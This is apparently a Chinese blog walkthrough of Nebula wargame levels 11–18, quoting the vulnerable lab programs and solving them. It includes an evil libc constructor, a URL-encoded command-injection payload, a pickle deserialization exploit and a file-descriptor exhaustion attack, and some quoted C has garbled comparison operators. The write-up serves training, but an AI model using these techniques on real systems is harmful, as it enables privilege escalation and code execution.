<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553930478_5c9f18ee44169.png" src="images/20190330/1553930478_5c9f18ee44169.png" width="690" height="228" /></div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553930478_5c9f18ee44169.png" width="690" height="228" /></div></noscript>
<h3>level11</h3>
<p>使用用户名和密码为level11登录ssh</p>
<p><b>详情</b></p>
</p>
<pre>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</pre>
<p>程序代码
</p>
<pre>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();

  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length &amp; 0xff;

  for(i = 0; i &lt; length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) = 0) {
      errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));

  if(length &lt; sizeof(buf)) {
      if(fread(buf, length, 1, stdin) = length) {
          err(1, "fread length");
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&amp;path);

      while(blue &gt; 0) {
          printf("blue = %d, length = %d, ", blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf("pink = %d\n", pink);

          if(pink &lt;= 0) {
              err(1, "fread fail(blue = %d, length = %d)", blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, "mmap");
      }
      process(mem, length);
  }

}<br /></pre>
<div>运行程序</div>
<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553932973_5c9f22adaf3fe.png" src="images/20190330/1553932973_5c9f22adaf3fe.png" width="543" height="250" /></div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553932973_5c9f22adaf3fe.png" width="543" height="250" /></div></noscript>
<p>分析代码时，有两个不同的分支导致process ()函数调用，最终导致system()函数调用。这为我们提供了两种不同的方法来利用这个程序。</p>
<p>第一个是Content-Length标头中指定的长度大于1024.为了利用这个易受攻击的路径，我们需要为程序提供一个有效的标头，指定内容长度大于或等于1024.我们将将长度固定为1024并分析我们需要在内容体中放置什么来执行我们的任意命令。</p>
<p>如果内容长度大于或等于1024，程序将打开随机文件描述符并将内容正文的内容复制到该文件。然后，将文件的内容读入在处理空间中分配的存储器段中。应用程序的最后一部分process()将解密内容主体并将解密的内容用作system()运行的命令。</p>
<p>我们需要做的就是加密我们想要运行的命令，后跟一个空字节，并用任何垃圾填充1024块的其余部分。</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553933870_5c9f262e6a31c.png" src="images/20190330/1553933870_5c9f262e6a31c.png" width="685" height="251" />暂且搞不了，下一个</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553933870_5c9f262e6a31c.png" width="685" height="251" />暂且搞不了，下一个</p></noscript>
<h3>level12</h3>
<p>使用用户名和密码为level12登录ssh</p>
<p><b>详情</b></p>
</p>
<pre>There is a backdoor process listening on port 50001.</pre>
<p>看到一个基于lua的http服务
</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553936206_5c9f2f4e61d8c.png" src="images/20190330/1553936206_5c9f2f4e61d8c.png" width="690" height="683" />漏洞出现在hash()函数上面</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553936206_5c9f2f4e61d8c.png" width="690" height="683" />漏洞出现在hash()函数上面</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553936477_5c9f305db462b.png" src="images/20190330/1553936477_5c9f305db462b.png" width="690" height="236" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553936477_5c9f305db462b.png" width="690" height="236" /></p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553936450_5c9f304252544.png" src="images/20190330/1553936450_5c9f304252544.png" width="670" height="173" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553936450_5c9f304252544.png" width="670" height="173" /></p></noscript>
<h3 style="font-family:arial, sans-serif;">level13</h3>
<p>使用用户名和密码为level13登录ssh</p>
<p><b>详情</b></p>
<pre>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</pre>
<p>程序代码</p>
<pre>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;string.h&gt;

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() = FAKEUID) {
      printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
      printf("The system administrators will be notified of this violation\n");
      exit(EXIT_FAILURE);
  }

  // snip, sorry <img data-original="images/index/smilies/icon_smile.gif" src="images/index/smilies/icon_smile.gif" alt=':)' class='wp-smiley' />
<noscript><img src='images/index/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></noscript> 

  printf("your token is %s\n", token);

}<br /></pre>
<p>运行程序</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553937962_5c9f362aa7169.png" src="images/20190330/1553937962_5c9f362aa7169.png" width="635" height="254" />逆向这个程序</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553937962_5c9f362aa7169.png" width="635" height="254" />逆向这个程序</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553940586_5c9f406ab7498.png" src="images/20190330/1553940586_5c9f406ab7498.png" width="690" height="380" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553940586_5c9f406ab7498.png" width="690" height="380" /></p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553940789_5c9f4135a1140.png" src="images/20190330/1553940789_5c9f4135a1140.png" width="690" height="763" />可以看到在getuid这里出现判断</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553940789_5c9f4135a1140.png" width="690" height="763" />可以看到在getuid这里出现判断</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553940995_5c9f420386406.png" width="690" height="350" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553941250_5c9f43021e7d7.png" width="540" height="700" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553941287_5c9f4327c52ea.png" src="images/20190330/1553941287_5c9f4327c52ea.png" width="550" height="106" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553940995_5c9f420386406.png" width="690" height="350" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553941250_5c9f43021e7d7.png" width="540" height="700" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553941287_5c9f4327c52ea.png" width="550" height="106" /></p></noscript>
<h3>level14</h3>
<p>使用用户名和密码为level14登录ssh</p>
<p><b>详情</b></p>
<pre>This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it <img data-original="images/index/smilies/icon_smile.gif" src="images/index/smilies/icon_smile.gif" alt=':)' class='wp-smiley' /> </pre>
<noscript><img src='images/index/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /> </pre></noscript>
<p>运行程序，发现似乎从0开始，并随着每个字符递增。然后，每个字符的ASCII值按键的当前值递增。</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553942490_5c9f47da54c97.png" src="images/20190330/1553942490_5c9f47da54c97.png" width="690" height="431" />exp</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553942490_5c9f47da54c97.png" width="690" height="431" />exp</p></noscript>
<pre>import sys

def decrypt(ciphertext):  
        count = 0
        result = []
        for c in ciphertext:
                result.append(chr((ord(c) - count)))
                count +=1
        print("Decrypting: " + ciphertext + " -&gt; " + "".join(result))
        return("".join(result))

decrypt(sys.argv[1])  <br /></pre>
<p><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553942996_5c9f49d4970ed.png" width="690" height="282" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553943021_5c9f49edca6ae.png" src="images/20190330/1553943021_5c9f49edca6ae.png" width="632" height="111" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553942996_5c9f49d4970ed.png" width="690" height="282" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553943021_5c9f49edca6ae.png" width="632" height="111" /></p></noscript>
<h3>level15</h3>
<p>使用用户名和密码为level15登录ssh</p>
<p><b>详情</b></p>
</p>
<pre>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary. You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth. Clean up after yourself <img data-original="images/index/smilies/icon_smile.gif" src="images/index/smilies/icon_smile.gif" alt=':)' class='wp-smiley' /> </pre>
<noscript><img src='images/index/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /> </pre></noscript>
<div>调试程序</div>
<pre>level15@nebula:~$ cd /home/flag15
level15@nebula:/home/flag15$ ls -al
total 12
drwxr-x--- 2 flag15 level15   80 2011-11-20 21:22 .
drwxr-xr-x 1 root   root     200 2012-08-27 07:18 ..
-rw-r--r-- 1 flag15 flag15   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag15 flag15  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag15 level15 7161 2011-11-20 21:22 flag15
-rw-r--r-- 1 flag15 flag15   675 2011-05-18 02:54 .profile
level15@nebula:/home/flag15$ ./flag15 
strace it
level15@nebula:/home/flag15$ strace ./flag15 
execve("./flag15", ["./flag15"], [/* 19 vars */]) = 0
brk(0)                                  = 0x8ff4000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77f0000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbf810304) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb77e7000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xd3e000
mmap2(0xeb4000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xeb4000
mmap2(0xeb7000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xeb7000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77e6000
set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb77e68d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xeb4000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xd17000, 4096, PROT_READ)     = 0
munmap(0xb77e7000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77ef000
write(1, "strace it\n", 11strace it
)            = 11
exit_group(11)                          = ?
level15@nebula:/home/flag15$ <br /></pre>
<p><span style="background-color:transparent;">我发现这个程度大量读取libc.so.6这个库，但是进入目录后没有发现</span></p>
<p><span style="background-color:transparent;"><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553943814_5c9f4d06b2301.png" src="images/20190330/1553943814_5c9f4d06b2301.png" width="548" height="121" />使用readelf查看程序</span></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553943814_5c9f4d06b2301.png" width="548" height="121" />使用readelf查看程序</span></p></noscript>
<p><span style="background-color:transparent;"><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553943934_5c9f4d7e4d051.png" src="images/20190330/1553943934_5c9f4d7e4d051.png" width="690" height="444" />新建一个库文件</span></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553943934_5c9f4d7e4d051.png" width="690" height="444" />新建一个库文件</span></p></noscript>
<p><span style="background-color:transparent;"><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553944057_5c9f4df930675.png" width="690" height="95" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553944148_5c9f4e5424a15.png" src="images/20190330/1553944148_5c9f4e5424a15.png" width="541" height="223" />创建两个文件<code class="highlighter-rouge">/tmp/level15.c</code><span style="color:rgb(114,114,114);"> 和</span><code class="highlighter-rouge">/tmp/version</code></span></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553944057_5c9f4df930675.png" width="690" height="95" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553944148_5c9f4e5424a15.png" width="541" height="223" />创建两个文件<code class="highlighter-rouge">/tmp/level15.c</code><span style="color:rgb(114,114,114);"> 和</span><code class="highlighter-rouge">/tmp/version</code></span></p></noscript>
<pre><span class="cp" style="color:rgb(153,153,153);font-weight:bold;">#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="kt" style="color:rgb(68,85,136);font-weight:bold;">void</span> <span class="nf" style="color:rgb(153,0,0);font-weight:bold;">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">init</span><span class="p">()</span>
<span class="p">{</span>
        <span class="kt" style="color:rgb(68,85,136);font-weight:bold;">int</span> <span class="n">euid</span> <span class="o" style="color:rgb(0,0,0);font-weight:bold;">=</span> <span class="n">geteuid</span><span class="p">();</span>
        <span class="n">setresuid</span><span class="p">(</span><span class="n">euid</span><span class="p">,</span> <span class="n">euid</span><span class="p">,</span> <span class="n">euid</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s" style="color:rgb(221,17,68);">"/bin/getflag"</span><span class="p">);</span>
<span class="p">}</span></pre>
<pre>GLIBC_2.0 {};</pre>
<pre>gcc -fPIC -g -c /tmp/level15.c -o /tmp/level15.o
gcc -shared -Wl,--version-script,/tmp/version,-Bstatic /tmp/level15.o -static-libgcc <span class="se" style="color:rgb(221,17,68);">\</span>
    -o /var/tmp/flag15/libc.so.6 </pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553944639_5c9f503f65a8b.png" src="images/20190330/1553944639_5c9f503f65a8b.png" width="690" height="111" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553944639_5c9f503f65a8b.png" width="690" height="111" /></p></noscript>
<h3>level16</h3>
<p>使用用户名和密码为level16登录ssh</p>
<p><b>注：当1616端口没有开启的时候，重启一下虚拟机就行</b></p>
<p><b>详情</b></p>
</p>
<pre>There is a perl script running on port 1616.</pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553946652_5c9f581cc1038.png" src="images/20190330/1553946652_5c9f581cc1038.png" width="690" height="692" />
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553946652_5c9f581cc1038.png" width="690" height="692" /></noscript>这是一个命令执行漏洞
</p>
<pre>@output = `egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1`;</pre>
<p>拼接一下url编码</p>
<pre>%22%3C%2Fdev%2Fnull%3Bpwnvar%3D%2Ftmp%2Fpwn16%3B%24%7Bpwnvar%2C%2C%7D%3B%23</pre>
<p></p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553949261_5c9f624d60308.png" src="images/20190330/1553949261_5c9f624d60308.png" width="631" height="233" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553949261_5c9f624d60308.png" width="631" height="233" /></p></noscript>
<h3>level17</h3>
<p>使用用户名和密码为level17登录ssh</p>
<p><b>详情</b></p>
</p>
<pre>There is a python script listening on port 10007 that contains a vulnerability.</pre>
<p><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553949630_5c9f63be1c2f8.png" width="690" height="529" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553950114_5c9f65a2da3a6.png" src="images/20190330/1553950114_5c9f65a2da3a6.png" width="690" height="285" />
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553949630_5c9f63be1c2f8.png" width="690" height="529" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553950114_5c9f65a2da3a6.png" width="690" height="285" /></noscript>
</p>
<p>exp</p>
<pre class="selected">#/usr/bin/python

import os  
import pickle  
import socket

class Pandora(object):  
    def __reduce__(self):
        return (os.system,(('getflag &gt; /tmp/flag17'),))

HOST = "127.0.0.1"  
PORT = 10007  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)  
s.connect((HOST,PORT))  
reply = s.recv(1024)  
print(HOST + ": " + reply)  
obj = Pandora()  
sobj = pickle.dumps(obj)  
print("Sending: " + str(obj))  
s.send(sobj)  
print("Awaiting reply from: " + HOST)  
reply = s.recv(1024)  
print(HOST + ": " + reply) <br /></pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553951475_5c9f6af3035f2.png" src="images/20190330/1553951475_5c9f6af3035f2.png" width="690" height="238" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553951475_5c9f6af3035f2.png" width="690" height="238" /></p></noscript>
<h3>level18</h3>
<p>使用用户名和密码为level18登录ssh</p>
<p><b>详情</b></p>
<pre>Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.</pre>
<p>程序代码</p>
<pre>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;getopt.h&gt;

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf("Unable to read password file %s\n", PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) = 0) return;
  }
  dprintf("logged in successfully (with%s password file)\n",
      fp == NULL ? "out" : "");

  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&amp;buffer, "--&gt; [%s] is unsupported at this current time.\n", what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
  printf("%s\n", msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, "d:v")) = -1) {
      switch(c) {
          case 'd':
              globals.debugfile = fopen(optarg, "w+");
              if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case 'v':
              globals.verbose++;
              break;
      }
  }

  dprintf("Starting up. Verbose level = %d\n", globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());

  while(1) {
      char line[256];
      char *p, *q;

      q = fgets(line, sizeof(line)-1, stdin);
      if(q == NULL) break;
      p = strchr(line, '\n'); if(p) *p = 0;
      p = strchr(line, '\r'); if(p) *p = 0;

      dvprintf(2, "got [%s] as input\n", line);

      if(strncmp(line, "login", 5) == 0) {
          dvprintf(3, "attempting to login\n");
          login(line + 6);
      } else if(strncmp(line, "logout", 6) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "shell", 5) == 0) {
          dvprintf(3, "attempting to start shell\n");
          if(globals.loggedin) {
              execve("/bin/sh", argv, envp);
              err(1, "unable to execve");
          }
          dprintf("Permission denied\n");
      } else if(strncmp(line, "logout", 4) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "closelog", 8) == 0) {
          if(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile = NULL;
      } else if(strncmp(line, "site exec", 9) == 0) {
          notsupported(line + 10);
      } else if(strncmp(line, "setuser", 7) == 0) {
          setuser(line + 8);
      }
  }

  return 0;
}<br /></pre>
<p>查看目录</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553951695_5c9f6bcf9cd88.png" src="images/20190330/1553951695_5c9f6bcf9cd88.png" width="623" height="315" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553951695_5c9f6bcf9cd88.png" width="623" height="315" /></p></noscript>
<p>启动时，程序会查找两个参数：<br />-d ：启用日志记录到提供的日志文件</p>
<p>-v：以增加详细级别</p>
<p>然后程序启动并将详细级别写入调试文件，并将EUID权限设置为二进制文件。该程序当时开始接受输入：</p>
<ul>
<li>
<p>登录 ：尝试登录给定的用户。在<strong>登录</strong>功能无法开启，这意味着，如果密码文件无法读取，那么它会在用户。我们可以尝试删除密码文件以强制<strong>fopen</strong>失败并返回<strong>NULL</strong>文件描述符，但我们无法删除该文件。使<strong>fopen</strong>函数调用的另一种方法是使它失败以耗尽文件描述符，以便不再分配给<strong>密码</strong>文件。这可以完成，因为<strong>登录</strong>功能永远不会关闭文件描述符。这是我们将探索的一种方式，让我们继续阅读该程序。</p>
</li>
<li>
<p>注销：只需清除<strong>globals.loggedin</strong>标志，这对我们没用</p>
</li>
<li>
<p>shell：这看起来对我们非常有用，它执行一个新的<strong>/ bin / sh</strong> shell（注意绝对路径，所以我们不能伪造它）并使用相同的<strong>flag18</strong>参数作为shell参数。</p>
</li>
<li>
<p>closelog：如果使用-d选项调用<strong>flag18</strong>，它将关闭日志文件描述符并停止记录。这将很有用，但请继续阅读</p>
</li>
<li>
<p>site exec：调用<strong>notsupported</strong>函数，其中存在格式字符串漏洞<span style="color:rgb(58,65,69);">(</span><strong style="color:rgb(58,65,69);">dprintf(what)</strong><span style="color:rgb(58,65,69);">).</span>但如果我们试图利用它，我们得到：</p>
</li>
</ul>
<div>后期会逆向回来</div>
<pre>level18@nebula:/home/flag18$ ulimit -a  
core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 15980
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 15980
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
level18@nebula:/home/flag18$ echo "`python -c 'print("login me\n"*1021 + "shell")'`" | /home/flag18/flag18 -v -d /tmp/log  
/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
level18@nebula:/home/flag18$ echo "`python -c 'print("login me\n"*1021 + "closelog\n" + "shell")'`" | /home/flag18/flag18 -v -d /tmp/log  
/home/flag18/flag18: -d: invalid option
Usage:	/home/flag18/flag18 [GNU long option] [option] ...
	/home/flag18/flag18 [GNU long option] [option] script-file ...
GNU long options:
	--debug
	--debugger
	--dump-po-strings
	--dump-strings
	--help
	--init-file
	--login
	--noediting
	--noprofile
	--norc
	--posix
	--protected
	--rcfile
	--restricted
	--verbose
	--version
Shell options:
	-irsD or -c command or -O shopt_option		(invocation only)
	-abefhkmnptuvxBCHP or -o option
level18@nebula:/home/flag18$ echo "`python -c 'print("login me\n"*1021 + "closelog\n" + "shell")'`" | /home/flag18/flag18 --rcfile -d /tmp/log 
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'r'
/home/flag18/flag18: invalid option -- 'c'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
/tmp/log: line 1: Starting: command not found
/tmp/log: line 2: syntax error near unexpected token `('
/tmp/log: line 2: `logged in successfully (without password file)'
level18@nebula:/home/flag18$ echo "getflag" &gt; /tmp/Starting
level18@nebula:/home/flag18$ chmod +x /tmp/Starting
level18@nebula:/home/flag18$ export PATH=/tmp:$PATH  
level18@nebula:/home/flag18$ echo "`python -c 'print("login me\n"*1021 + "closelog\n" + "shell")'`" | /home/flag18/flag18 --rcfile -d /tmp/log 
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'r'
/home/flag18/flag18: invalid option -- 'c'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
You have successfully executed getflag on a target account
/tmp/log: line 2: syntax error near unexpected token `('
/tmp/log: line 2: `logged in successfully (without password file)'
